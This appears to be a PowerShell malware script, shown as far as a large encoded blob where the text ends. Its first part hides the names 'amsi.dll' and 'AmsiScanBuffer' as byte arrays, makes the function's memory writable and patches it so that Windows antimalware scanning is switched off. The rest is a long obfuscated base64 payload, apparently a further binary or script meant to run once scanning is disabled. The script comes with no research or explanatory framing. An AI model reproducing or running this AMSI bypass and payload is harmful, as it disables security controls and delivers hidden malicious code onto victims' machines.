
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "c2B7dmF8ens1XHtjen5wOEZ9dGdlRWd8e2FbfHJ9YXh0Z3Afbh81NTU1TlZ4cXlwYVd8e3F8e3I9
PEgfNTU1NUV0Z3R4NT0fNTU1NTU1NTVORmFnfHtySB81NTU1NTU1NTFWenh4dHtxNSg1Nzh9Nx8f
NTU1NTwfNTU1NTF3dGZwIyF3fHt0Z2woN0FDZERUVFhUVFRUUFRUVFQ6Oi1UVFlyVFRUVFRUVFRU
RFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUclRUVFRUIXNg
ciFUYVR7W1x3cldBWCV9Q1J9ZXZsV2J2eCx7dnhTYVxSW313eCBjcVZXfE9GV2xxQiFydEIhckdQ
LEFcUiRjT1JAYFFEJV5fVFRUVFRUVFRUV0RHRFRUQVRQUVRYXEdzdi1UVFRUVFRUVFRUWlRUXHJU
WVRBVFRUVnpUVFRUXlRUVFRUVFRUTH5+VFRUVHJUVFRUTFRUVFRUV1RUVFRyVFRUVFRyVFRXVFRU
VFRUVFRUVFJUVFRUVFRUVFRUVnJUVFRUVHJUVFRUVFRUVFhUTFxAVFRXVFRUV1RUVFRUVFBUVFRQ
VFRUVFRUVFRXVFRUVFRUVFRUVFRUVFRUV1dfVFRXRVRUVFRUUlRUVFZUUlRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRcVFRUVGJUVFRUZkZUVFRaVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRcVFRUVlRUVFRUVFRUVFRUVFRUVFZWVFRUUHJU
VFRUVFRUVFRUVFRUVFYgJU9NfSVUVFRUdFZ+VFRUVHJUVFRUXnJUVFRUXFRUVFRUVFRUVFRUVFRU
VFRUVFZUVFRSVGB2e1tsTGJUVFRWVFJUVFRUTFRUVFRUclRUVFRmVFRUVFRUVFRUVFRUVFRUVFRU
V1RUVFdUWXtfeXdSLH9UVFRYVFRUVFRcVFRUVFRWVFRUVFtUVFRUVFRUVFRUVFRUVFRUVFRURFRU
VERyVFRUVFRUVFRUVFRUVFRUVFRUVFRXUEZEVFRUVFRUVFByVFRUVFZUVEBUX1Z2VFRUcn1UVFRR
VFRcVFFUVFRXclRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFchVl5XRFRUVHpkUG9UUlRSLVRUVFRXVFRUR3N9QFRUVHpeVHJYUFdH
fkZUVnJTVFRUUllGQHpTclRUVntcV1RUV2JeV3ZUVFRlb1JUVFRWeC1PVFRUXl5XelRUVGVjUmJU
VFZ9TGRXfHJQVFRUUllGYnpTclRUVntcZ1RUV2JeV3ZUVFRlb1JUVFRWeC1PVFRUXl5XelRUVGVj
UmJUVFZyTHpUclRUV3xMQl59dmRgfHJRVFRUUllGQHpTclRUVntfY1RUV2JeV3ZUVFRlb1JUVFRW
eC1PVFRUXl5XelRUVGVjUmJUVFZ9TGRTbHpwVHxyQFRUVF5eclRUUm9UUVRYJVdUVFRWVFRUR1NU
ZkBRXV5xVFRXYlFNWVNUVFdiUGJHbCJiVFR2V1hTVH10dFBiTFZZV1xWf3xiWlBET2xZYlBUdlZy
dlRUVF5ZUSRsW0RQVHZWcnFUVFRedn52V1RdVHpdRFRUVnted1REV2JeVyVUVFRlbCRiUFR2VnJx
VFRUXnZ7RFZUXVR6XURUVFZ7XnZUcldiXlclVFRUemRUfXR0VnJeWnRHcm1RclxMeHIlVlJPekFX
VFx0eH1YU1ZHUFBQRENvUHJUVFd9WF1UeiBlU29TVFR6IGVSb1QjVH1wdFZidnpRclRUV31PY11y
VFRWfHJzVFRUXnZ7ZlFUXVR6UnJUVFZyYlxeVlRUVFR6IHtyVFRUXV5zVGJXYl5XJVRUVGdxLWJU
VFRUXlp0R2ZtVkRcd3hyYiFyVFRUVFZyRVRUVFJQYnJHVldYX1N9WF5eb1hHVkdQXnpiclRUVFxB
Vm1QWXBtJVRUVEdjXERUVFZ7WX1UYldid2xcVFRUemZWfVBZcG0lVFRURFheYiFHVn1xTFBiekdW
fVBff3h+bG1EcnpcVFRUVnxiYXZjLVFUXVRHVld0RVZUVFRUe2ZxVFRUUHZ8UFBUXVR6XGJUVFZ8
cnFUVFRedmUtUVRdVHpdRFRUVmEgfnZlLVBUXVRcXld6VFRUenpdRFRUVntZV1dUV2JXfHJ0VFRU
Xl5XJVRUVGVsJmJEVHZWcnFUVFReV3JyXV5UJVRUVE9sPkREVHZWcnFUVFReV3JyXV5UJVRUVE9s
UGJAVHZWcnFUVFReV3JyXV5UJVRUVHdwUVdQXVlUdkdXJy1+VFRUXiZWelRUVFdXXVRUVFRyVFRU
X1hUVFRUYVREVFRiVFBUVFRiVFRUVFRUVFRUUG9UUFRQYldUVFRRVFRUR1ByUT5TRHJUVFRcRlRX
eSxSclRUV1dcVHZ8JVNUXVcsXWJUVFdXXFRUeyVwVFRUUFByVFFzRyVUVFRERlRdX2FXRFdic0di
VFRUREZUXV5TV0RXYnNHZlRUVERWXlZAVFRUellzclhUVFREc1BSVHJUXFRUVFJUWFd6YlxUVFRW
XlZMVFRUenpfYlRUVnIlUn9UclRUVFxfU3xyelRUVF5XV3JfVlZyXlRUVFJfe15HV0RXYl5XdlRU
VHpBV1dcUF5WflRUVHp6UnJUVFZ8cnFUVFReVkZyZFRUVF5QcldsZ0RAVHZdJXNUVFRQU21YU1pc
flRUVFRGVF1Zb1dEV2JQREJYXmJUVFREdnpeYlRUVnslc1RUVFBXemJcVFRUVl5WTFRUVHp6X2JU
VFZ9WFJXemJcVFRUVlBETEJeVnJUVFR6UFJXUFJWVnJeVFRUUl98ck1UVFReUGJ2R1d8cmRUVFRe
UER2YVlNX3dXcldiUERCWF5iVFRURnJmVFRUXlBydnpeRFRUVnxydFRUVF5eVyVUVFRlbHBiTFR2
VnJxVFRUXl59UFNTJHJBV0dQU11tIT53Yzo6Omx6d1hUQFRsYlRUVFREVFRXUFZTISVmVFRUV19H
THNNXyRjWURUVFZ9VFR2ZHZSVF1UXnZsIVRUVHpZXFRcVFRcVFZeVi1UVFR6WFZUT2NYVFRUVngt
bVRUVF5zfFBUVFREeVlHdnhzfFRUVFRBPld9dlRUVE9vWHJUVFZ8QlRcRFRUV1ZyV1RUVGd3b0RU
VFR6W15vJV93b0BUVFR6QVdUclJ2eGJdVF1UR1dWcn9UVFRed29UVFRUZWx2VHZUdlItJ1RUVF5x
Vn5UVFRQQVdHUFNeVlRUVFR6YVZUdkdXQi0mVFRUXlZCLSFUVFReWXdjcFZyfmZXcnljX1RUVFZh
Ylx3b35UVFRncFFGT2x+VHZUdlZycVRUVF4mclRdXnJUV11UVFRUcld9VFB4ZFRUelRUVFRUVFRU
c1RfJy1UVCVEVFRUV1BvVF1UWERUVFRUU1RUVEdTcnpCVm1HbHdEQFR2V30+U0RUVFZ9TEZUV1xX
XlRmVFRUTGZWJllyV2JXYnZvelRUVGUjXld2VFRUelhWVywjWXJ2XHZtclRUVGUjV3xye1RUVF5R
R0dsd0RAVHZXcl9XfVxUUHJQelZiVFRXfG15VyElXFRUVFZQYkRGVGxyIlRUVF5QYk1EVlRUVFR8
ci1UVFReUGJMR1d8cixUVFReUGJ2QlBicmdefVBQUERyR1dNWD5UVFReUERMekViVFRWZEBcVFRU
VmVUclRUVFxHV0dQXXR5ckFXR1BcUyRyQVZXUFx0cnFgWGYtX15WelRUVHpHV1Z6elNiVFRWe1hM
VFRUXnB9IVZeV0RUVFR6ZFBvVFdUUHJUVFRUVFRUVFRTIVRXVFRUUFJcVFZUVFRQUnpUUVRUVFBd
elRQVFRUUF1tVlRXRFRUV1ZUVFBUVFRyVExUVFREclRWVFRUXFRdVFRUUFxUVlRUVFZUVlRUVFdW
VFRUVFBUclR+VFRURGRQb1RSVFBiVFRUVFJUVFRHVHxyQFRUVF5XVFhTXWJ+QlR7Yl5UVFRQXldE
VFRUTGFdVnJNVFRUXlZ7XEBWVFdiV3piZ1RUVFdeVmJUVFRlb0RUVFRWe3pWVHtmXlRUVFB3JVBU
VFR6ekRyVFRWeyVZVFRUUF55IVZwYmZUVFRHY0RiVFRWcl8iVnJUVFdSLFBUVFReXnwgb1NyVFRX
elRyVFRUUF59IVZeV0RUVFR6ZFhyW2xnYnJUdlItfFRUVF5efFxWU2x9U1RUVF5ef1xWcCVMVFRU
enpSRFRUV3x6VER5W15EclBUVERUVFRUVFRRVFRUVF1MJVl/VGBYb1RvWEF+VFRUVFRXRFdmVFRU
VGFUclRUVls+VFRUclZEVFRZVGZUVFZbQXFdX2V3eHFvVFRUVFRQYkBUVFFAVlRUVFwkQ0FUVlRx
VFRURFRUVFRcJXFDRkBEVFRUVGJdRFRUJ1RYVFRWW1Z3Uix8VFRUVFRUVFRUVFxUVFRTTXNiXHZW
RHpUVFRRI1RBWFRTclRUVERUVFRRRFRUVFReVFRUVFxEVFRUV3pUVFRUelRUVFRURFRUVFBMVFRU
VFtUVFRUUGJUVFRUTFRUVFRXVFRUVFdyVFRUVERUVFRUUFRUVFRWRFRUVFRQVFRUVFFUVFRUV3JU
VFRUUFRUVFRUVFxAUlREVFRUVFRUV3JWX1dNRF9XclRkV3tEX1dyVmBXUFxfUWJWQFZEVFRXclFC
V0UtXVdyV3FXcy1dV3JUPldzLV1XclRHV2MtXVdyUVJXcy1dV3JRJ1dzLV1XclFhV0UtXVdyUVZX
U0BfV3JWcldTQF9XclR9V3MtXVdyVFxXd3ZSV3JXWlZ6cl1XclFiVzpcX1dyUXNXc1xfV3JUbFQh
cl1XclcmVnItXVdyUX9UZFhfV3JWLVZ/QFxXclciVlFAXFdyVmVXQUBcV3JXXFdjJV5XclcjV0xy
XVdyVkBXIXJdV3JXYVReLVZXclF5VntEVFdyV3NUXi1WV3JUbVdccl1XclRyV1xyXVdyVlNXXURf
V3JWTFRccl1XclQiVkxyXVdyUVxUIXJdV3JWbVZfeldXclRdVyRAX1ZyVEdWVn5dV3JUZ1Zccl1X
clFBV3pyXVdyUX1XZXpXV3JWUFRccl1XclcnVlxyXVdyVyFXe0RUUXJUe1QnelxXcldHVF4tVldy
VFNWRCFeV3JXX1Qhcl1XclRyVlxyXVdyVD5UJEBfV3JUW1ZiLV1UVFRUVFhEVFRUVFRUVFBUVERU
V1RXVFQ+VH9/VkBQVFREVFdUVFBUUFRWT1c+WF9ERFRXVFRcVFREVERUXVxdW3JHV1RUUFRWRFRW
VFdEVCFydlRUUFBUVnJURlRUXFdUVFQnVERUVHdEVFtUV0BUVHJQVFReRFdUVFdhVFdAVFNEVF5U
R1RUfHJUVFRcUFRSclRDVFRYfVBUVmdUclRURERUclRXQFRUclBEVFx2UVRUV0NUVlxUUlRUQlRU
WFdEclxCVFohVERyXEJUWmJXRHJcQlRFLVdEclxCVFxcVkRyXEJUWVhXRHJcQlRRVFZEclxCVFtc
V0RyXEJUV0xXRHJcfVReelFHRFx9VF9YXkZEX0dyV1xWQURcUldlelZEcl9CclBQV0BUX0JyXERX
QFRfQnJTZldAVF9CcltyVEBUX0JyUi1XQFRfQnJSXFZAVF9CcldcVkBUXFJXZXpWRHJfQnJQflZD
VF9Ccl52VENUX0JyVFBUQ1RfQnJXelRDVFxSVFt+XURyXFJQW2JRQlRcUlBTQF5CVFxSUFt6UkJU
XFJQWVxRQlRcUlBZYlFCVFwnVFhUVEJiXEJUUVhUTWJfRFxUVFRUVFZSUlctX1dyVFdUVFRUVFRW
VFRfUHJ0RFt6VHJQVFRUVFRUXFRUfkZWfld4JVZUclRUVFRUVHJUVkJcXC1cdFRcVlRUVFRUVFZU
VF9Mcm9EV21UclhUQlZUVFRUVFR5clZyVyYhVlZEUUFcVFRUVFRWQlRZXF13RFxbVFRcfVRUVFRU
XExMXWJ+UlRUJVRUVFRUVFxUVH5GUWdWXHZWUURUVFRUVFRyVFZCXF5+XnxiXFtUVFRUVFRWVFRf
UHJcRGRBVH1QVFFWUFRUVFRUeXJRVlcjVFZSVFRQXGJUVFRUVkdUWWJcZXJcT1RTYn5UVFRUVF9Q
VFtUZGFUfWJUQFZAVFRUVFR+RFQlVmdMVl1EVHJfclRUVFRWUlJXLV9XclRxVFZyeFRUVFRUX1BM
X0R4LVR9JVRzVkxUVFRUVH19cnNWdlRWXURRQF9yVFRUVFF4VE1QUFdyVHJUVFRUVFRWVFRfUHJl
Yn9dVHxUVCJWTFRUVFRUfkdyeVZ3YlZfclEhX3JUVFRUVlJSVy1fV3JUeFRUVHtUVFRUVFxYVEVE
VyBUVkxUUUZ2VFRUVFRyR3JzVkRMVF9iVFRUVFRUclRWR0xSflF0VFx7VFdMe1RUVFRUWERUQmJY
bFRGflRUVFRXVFAlXlRUVFdUXmZdVFRUV1RFWFFUVFRWVFh2XVRUVFFUVEBRVFRUUFRWelBUVFRT
VF0tXFRUVFJUXnpdVFRUV1RFdlFUVFRWVFhmXVRUVFFUVH5RUFdUUFRWYlBQVFRXVFtiUVRUVFZU
US1dVGJUUVRTflxUVFRQVFghX1RUVFdUW2JRVFRUVlRTQF5UVFRRVFBAXVRUVFBUU35cVFRUU1RZ
UFJUVFRSVFghVlRUVF1UW3JWVFRUV1RbIV9UVFRXVFpMUlRUVFZUW3pSVFRUUVRUflBUVFRXVFR+
UFRUVFdUW1xdVFRUVlRUVFBUVFRRVFdcUVRUVFdURVhRVFRUVlRYdl1UVFRRVFRAUVRUVFBUVnpQ
VFRUU1RdLVxUclRSVF56XVRUVFdUXFhdVFZUVFRUVFRUVFRXVF5mUVdEV1tUVH5UXWJ+V1RXUFRd
Yn5SVFd+VF1ifl5UVn5UXWJ+RFRRUFRdYn5EVFF+VF1ifkRUUFBUXWJ+RFRQflRdYn5EVFNQVF1i
fkRUU35UXWJ+RFRSUFRdYn5DVFJ+VF1ifkRUXVBUXWJ+RFRdflRdYn5EVF9QVF1ifnRUWFBUXWJ+
clRYflRdYn5SVFtQVF1iflJUVH5XXWJ+UlRcUFRdYn5SVFd+V09EcmZUVlBXIURyY1RRUFdvYnIk
VFF+V11ifldUUFBXUmJYIFRQfldFYnosVFZ+V1NyRERUUH5XLURlTFRWUFdTckdwVFRiVHBycWVU
U1BXIXJbY1RQflddRGElVFB+V21iciBUUH5XI0R5IFRQfldFYmU+VF9+VHZERFJUU1BXJVRbY1RR
UFd7RHRHVFFQVyJydEJUUVBXWVR4d1RTflclREwgVFFQVz5idHxUUH5XR3Jke1RQfldHcmRgVFB+
V39ic1JUVGJUXWJ+UlRaflQlYmdYVFp+VGxUZ0NUWn5UY2J7d1RXRFRdYnt6VF1QV0ZyQWBUV2JU
UER+QVRGRFRMcnp8VHB+VHdiTHtURGJUbHJcZlRMUFd3cnpsVHB+VHRiRFJUUFBXXWJ+RFRXfld7
YldTVHN+VHFEW19UQVBXe0RPR1RHflddYnlNVEFQV01UR3ZUT1BXXWJ+RFRffld5Ylt7VHRQV3BE
R2dUdFBUdkREUlRffld2RERSVF5+VF1ifkNUX35XZGJYZlRUclRYVFcjVER+VFhEVyNURH5UWlRX
OlREflRFVFZQVER+VERUVl9URH5UR1RWWlREflRGVFZBVER+VEFUVkxURH5UQFRXI1REflRCVFZx
VER+VE1UVnxURH5UTFRXOlREflRPVFZQVEYhVFZiUUFUfCFUUGJRdlR8IVRSYlEiVHwhVFxiVFBU
bCFUXmJUcVRsIVRYYlRxVGwhVFpiVHFUbCFURGJUUFRsIVRGYlRkVGwhVEBiVHFUbCFUQmJXVlRs
IVRMYldcVGwhVHRiV2xUbCFUdmJXOlQtWFR+YlZ8VHBYVH5iVnxURlhXeGJWfFRGVFFyYlFfVGxU
UXxiVnxUQUxURXJcIVRRIVZaclQ+VH9iVEVyXD5UUSFWQWJXVFRyXFRTVFZ7VEZyVERiVlNUWURU
W3JTf1RDcl1PRHFZVyBiXkxiUXJUVGJXXVRTVFREQFR0RFhWVFBUV1diVn5XclhURFRQX1RcLVxU
RFdUVERmVG9EVFdUVFRXUGJRZ1ZUXFRHclBDVF5+XldUV1JUR3ZUXER6UFRQRFdeRFZ7VlRQVFRU
UG9UUn5RVHJUUHJUVFRURFRUVFRUVFRUVFRUVFRUVFRUJ1dUVFRXVFRUVFRUVFRUVFRUVFRUdkRS
fFRyVFRUVFRQVFRUVFRUVFRUVFRUVFRXbVRMcl1UVFRUVFREVFRUVFRUVFRUVFRUVFRdUFdAVERU
VFRUVFdEVFZUVExUVGJUXVRUWFRWVFRQVFR+VFdUVF5UVEBUT2JUXFREVFRUVFRUQVAsXUElIW9Y
eSxEQH4sQkZAR1NAeSxNRkAgWkNRRGJUUG1FRyUsWlhvX3NAU19FQ355UEdDX3NDJXlaQXlEJFhU
VC1Ff3lzTW9QJE1vVFRFUnF5cVBHbHRNT3l2e1g+THksc1hBQ3NYVFdfR0IgJHdCQ2xMQl9mT0JU
bVRQeVN3e0NhT01ffXFSLGxMUVBUQVJ5b3FSVG1UUCRlTCZfY3YnLHhxViBNdEIhb1hyV193e0Rv
WHJXUEB+eUJHQ19zRkAgUkEkLWxUUE8kd3hbclhyV0B3JXlgcVFMJVRQbUVHJSxaWG9fc0BTX0VD
fnlQR0Nfc0MleVpBeURvW0RULUV/flRFUCRjT11DZk9BIVRBUix7dycgQ3YnQ2xERFdYQSVxRUF/
WGxNJW1FRyUsWk0kW1NAeU9fRCVAVERDV1BNJFtAQH55UUNTLFBBJHFaRyRfV0dQQFREQ1dQTSRb
QEB+eVFDUyxDQFBxRkRAR1NUUFNER1MsRkdDR0NAfiBzRH5tRUQlYV9BfnFzQCRHV0NTQ0FNJVtF
R1BAVEFQLF1BJSBzQ1N5REdEV1hBJXFFQX9YbE0lbUVHJSxaTSV5WkNQQ0ZEQFtARkNPU1RQbUVH
JSxaWG9fc0FQLF1BJSBzRH5TQEQlclRBUCxdQSUhb1h5LFhBJXFFQXksQ0F+bUVEJWZUQVAsXUEl
IW9YeSxYQSVxRUF5LFpHQ0dNQSRfWVRTWyB2Jkd5d0YgX0FiV1hBJXFFQXksREB+LEJGQEdTQHJX
V0BQR3NHUCxaQ1MsUUEkV09NJU9fQVBDQU0kR0VNJVtYQ0NbQEdDXFREQ1dQTSV5WkAkR1dBUG1z
QyVTRkF+Q1BNJUdGRkNPU0ByV1dAUEdzRCUsREJDLFdBUG1zR355WEdDWFREQ1dQTSVbRUBTeXNB
fkNNTSVPX0FQQ0FUUG1FRyUsWlhvX3NBUCxdQSUgc0F+Q01NJVtGR0BHU0F5R19EQG1BVFBTREdT
LFFBJFdPTSRHRU0lU1hBUyxBQFAsRUFQQ0ZAYldYQSVxRUF/WGxNJFdGQSRPX0dQQ0ZNJUdTR35T
Q0FTRFRBUCxdQSUhb1h5LFhBJXFFQXksWkdDR01BJF9ZTSVbWEdAU0ZDUENMQ1RXV0BQR3NEJSxE
QkMsUkB+LFtNJUdfQH5DUUNQLEZCRFcnTEJtJE9DLHNUUiRvTCcsbHdSeXxUUWI+TGJXQXBNWyVP
QiVgRCcsZndSQ39xUnljd3tYYEcnQ2BPTV9lTGJXV09SRFR2Ult8QXhDeU9SQ35UXVd/QHhDJXZ7
Q2BPQkRUQCdTeE9AfX13eEdmT0NleXZ4LEV2fiRld3tDb0EnIHlGTVtfd3tPfXdSeX5UUm1idiZl
RExNW29xJyxsT1RXYkxNW29xJyxsT1RXe09NR3NBQkNvdidTe09EV1N3e0NhT01ffUx4bXlUUHlQ
dE1bYncmW31MeG15VFNbfU94Q1xMQiB+d1JAVEB7Q2BxUnlhT0NHIHZSQ1xMQiB+d1JAVEB4Q2ZP
QlNvT0B9fXd4R2ZPRFdRd1Isb09AfX13eEdmT0RXXU9NR0BwTVd5R3tfY3dAfX13eEdmT0RXQUxC
T3lDUixnT0IgXExCIH53UkBUR1JTYE8nQ2x3JkNvRydDJUZSU2BPUm15VFMsekxCIH53UkBUdlBH
fXFSU1J0Qm15VF1XUXcnIHh0QnFSdEJteVRQW2N3e1tjd1JAVEcnQyVHeHlmT0AgfXdCQFR2UCB9
d0JAVEcnQyVHUnlsT0JbJXcmXyBBeFNhT0RXZnZdWyNDTVt5dnggfXdCQFRxTVt5dnggfXdCQFRM
Jyxhdl1DJU9NX2BMQiR5VFNxbHRNR3lBUnlgT0RXQkxCbSRPQ0cgdlJAVE9dcVh3J3Fjd3lHIHZS
QFRAJ319dntXRHZ4eWBxUCBlTyd9JXdCU2xPRFdNdFJDbE9EV0FwTVslT0IlYEQnLGxPRFdEcV1f
QHckWyV2e0N/cV1DbE9EV1F3UixvT0RXUHRNW2J3Jlt5VFB5YXZSQ2x2JyxgTE1HeVRQW2N3TVdl
d1JDbEcnQ2BPTV99cVJDfkRNRyV2eHl8cU1HeVRQcSR0QkdXcV1HbHRCXyRxUkBUR1JDfHFCcXtM
Ql9mT0BTJXFdX2VMe0MlT0RXUXcnJEJ0TVtlTHhteURNRyV2eHl8cU1HeVRQU292J0NhTHhtIENS
eSV3UkNXcV1HbHRCXyRxUkBURE1bb09CJHx3XXlAdnhTfk9CJH12eGFXcV1HbHRCXyRxUkBUQ1JT
bE8nQyVHe199d0JDJncmX2dETUcldnh5fHFNR3lUUFNvdidDYUx4bSBHeHlmT0NPeXZ7W2V3JyBX
cV1HbHRCXyRxUkBURE1bb09CJHx3XXlRdycgeHRCcSR2eFMldEIsYERNRyV2eHl8cU1HeVRQU292
J0NhTHhtIEdSQ29MJl9ldl1HZXcnIFdxXUdsdEJfJHFSQFRHeG19TyZbV3FdR2x0Ql8kcVJAVEQn
LGF2UnlmTE1HZXcnIEZPQm19cFJTJXRCLGB2JVMlcV1fZUx7QyVPRFdGT0JtZUxCX2V3UnklcEBb
Y3d7R2xMQlslRE1HJXZ4eXxxTUd5VFBTb3YnQ2FMeG0gQF1fY09dQ39xUFMlcV1fZUx7QyVPRFdE
T01fYXRNW290QixgQCdDJURNRyV2eHl8cU1HeVRQU292J0NhTHhtIEQnLGJwTV9lTyd9JURNRyV2
eHl8cU1HeVRQU292J0NhTHhtIEQnLGF2UlNgcEBTJXFdX2VMe0MlT0RXRnFCICV0QiR5RCcsYXZS
UyV0Ql9ld1J5JXBAUyVxXV9lTHtDJU9EV0FxTVdidnhDb3YkQ2B3QlNgTEJxeU9QW2NPUkNBT0Jb
JHZ4eSVwQFMlcV1fZUx7QyVPRFddT01HQkxCbSRPRFdGT0JxZXYmR2xwQH1lcXhAVEAnfX12e1dE
dnh5YHFQIGVPJ30ld0JTbE9GIHlwUkBUQCd5I09ALHhUU195cXhDbHFTR2NAJ0NmT3JXf09QXyRP
cldBcE1bJU9CJWBAe0NgcVJ5YU9GIEJPTV9vdEIsYHRCIHtUU0djQCZHbHRCIHtUXVdQdnh5J09N
X0RMTUd6VFJHZnddV31xUnJUREJtZncnW1xHJ21jTHhTZlRQT2xPQkNcRydtY0x4U2ZUUCR9dntb
ekxCYlRAJnlvcVJDYVl5W3lMJkNsdE1HIFl5V2x0QiB/dE1XfXdUV0FwTVslT0IlYEQnLGF2Uixg
T0IgJUFCLH5PQmJUQVJDJ09CYlR3UkMnT0JiVERCRydMTVdlWG9cYE9SbWZUUlN+cXhTYnRBWGxZ
eEdmd1RXZ09NX2BPQmJvWHwgfndSYlRAXV9jTyZffXdEV3tPTUdzRk1HeXdEV2VxUkNhVFNbIHYm
R3l3RFdAdnh5YVRQQ2BxQiVURENHY3QnQ2BUUCR9dCdDQHcnYXl3cldidFNHY3QnQ2BUU195cXhD
bHFQT2x3JyRAdydheXdyV1tMQnlgVFJtYnYmZVB3JyR9dEIhVE9SLGFMQnlgVFJbQk9NX290Qixg
VFB5YXZSQ2x2JyxgTE1HZXcnIVRAJ0N/cU1fZXFdeVdMJkdldychVEAmeW9xUkNhWXlfeU94bXlM
JkdldychVEMneWBYb19TcFJbeXZdR2V3JyFURE1XYndSeX9MTUdldycgU3BSW3l2XUdldychVEAm
eW9xUkNhWXlfJHd7R2V3QkBgRCcsYHYmR2xMQnlgT0JHU3BSQ39xTUdldychVHZQR2x0TU95dn55
YE94LVRCeENsd2JXQXBNWyVPQiVgQVJ5YHZEV1F0UlNsVFBbeXZyV35xJW1jTycsYEBdX2NxeHl+
T01cVEZCJGJPTV9vdycgfXFSQ1h3J3F7T0JHRXd5Q29PTVxUQVIse3cnIEN2J0NsVFNHeXBdR012
eHklT01cVExCR35AXV9ld3tHeXZyV0B3JW1jcSdDbFRQcXlxUG19diZHTXRCIW9YfkNsdngsbFRS
cXlxUyxTdntfY3ZyV11PTUdYTE1bJUdNX2x3JlxURkIkYk9NX293JyB9cVIsbFRQeVN3e0NhT01f
fXFSLGxUUHF5cVBDYHFCJHl2eFMldyZcVFl4WyV3JlxUWXhbf3FSLGxUU1sldntDf3FdQ2xPQ0dj
QF1HbFRQeWBxU1cldnJXQXBNWyVPQiVgR1J5fU8nIGN2JkdlTCZYVEAmeW9xUkNhWXlfJHd7R2V3
QkBgRkIgJU9NX2N2U1t5dntPZUwnQ29UU1sgdiZHeXdGIEZxQiAldEIkeVl+W2N3TVdld1JDbEAn
Q2xxeHl/T01YVEdSQ3xxQnF7dEIge0FCLH5PTVhUQUJ5f3Z4LG93J08lWXlxZXd/WGxZeVt9T3hD
XExCIH53UkNvVFBxeXFTWyRMfmF5cEAgfXdCQ29UUkcmR3h5Zk9AW2N2XXlSd1JTe3ZiV312eHFv
VFNHY3cnbW9UUFtjd3tHfXRCIG9UU1sgdiZHeXdGIEFPQlskdnh5JXBGIERPTV9hdE1bb3RCLGB2
YldBcE1bJU9CJWBEJyxmd1JDf3FSeWN3e1hUR0IgJHdDV2x0QiAlT01fUHZ4eSdPTV9vVFJxeXFQ
R2x0TU95dntYVEQnLGBMJ1MlVFBPY3Z4JH1xVFd6QSdfZE9CWyVUXVdTd3tPZXZ4LGB3QkNgcVRX
e09NR3NEJkNsdnhDYHFUV1t3Jk95QXhDIXFUV010QiB+dyZxb0ZCJGJPTV9vdycgfXFSeWN3fltj
d3tHeXBdRFRNJ1tjd3tHeXBdRFRxJ3lgdiZXY3cnYmBPXV8nVFBTfk9TV2x0QiAlT01fUHZ4eSdP
TV9TcFRXUXcnIG90TVslT0Igf3BEV0V2UkNgQCZDfEYnQyBUUCxiT0IgRk9CJGNxUkNWTE1beUYn
QyBUU195Tyd5b3FdXyBGJ0MgVFIsYk0lQ21xQlNmdE1HIFRTWyB2Jkd5d0YgQU9CWyR2eHklcERX
TXRCIH53JnFvRkJHeXd7R2VxXX5URk1bWnFCbWZBJl9Td01XJXBEVFRUVnlYVFItVE9iV2NUUiFU
Q0RXb1RSQFR2cldXVFZyVF5EVHJUUEBUdnJXbFRSLVR2clQjVFZUVFRQW19UUiVUdlRXeVRdXFR2
YldjVFIhVExEVyVUUkBUQVRXY1RSdlRPYld5VFJEVEFiV2BUU0BUdmJXeVRdXFReVFRlVFZUVEdE
V2xUXVxUd2JXbFRRelRcVFRUWUNcVE9EVydUUkBUdnJXJVRTRFR3YldBVFJAVHdUV3hUVnJUXkRU
clRQQFR2cldsVFItVHZyVCNUVlRUVFZxWlRSQFRxcld5VF1cVEdiV2NUUiFUd3JXfVRQdlR0RFcn
VFJAVEJEV2NUXUBUQ0RXYlRUVGVBcld5VF1MVE9EV2xUUHZUd2JXYFRSIVRMRFdYVFJAVHFUV09U
Ui1UcURXUFRSLVRxYldgVFRUOkFyV3lUXUxUT0RXbFRQdlR3YldgVFIhVExEV0ZUXUBUd3JXV1Rd
XFR3YlckVFIhVE9UV1dUUiFUT1RXUFRSQFR2Yld5VF1cVHFUV09UUi1UcURUVFdGJVR0VFRXUEYl
VEFUV2NUUlhUTERXZlRSYlRwRFRXQGxUVFlyV3ZUU1hUdFRXfVRdXFR2VFdEVF1cVHREV2BUXURU
QXJXZVRSdlR0VFclVFIlVExEV2xUUkBUWXJXeVRdclRPRFRyVFBYVFpyV3ZUUlBUT1RXflRQWFRx
RFd8VFJAVFlyV35UUmJUd1RUVFpsJVRAcld5VFIlVHdiVyVUUkBUXFRXJFRdWFR0RFdgVFJ2VFxU
V39UXUBUdnJXbFRSQFR3clclVFZUVExiV2NUUiFUcVRXeVRdclRxVFRXcl9mclRWIVRNVFdBVFJy
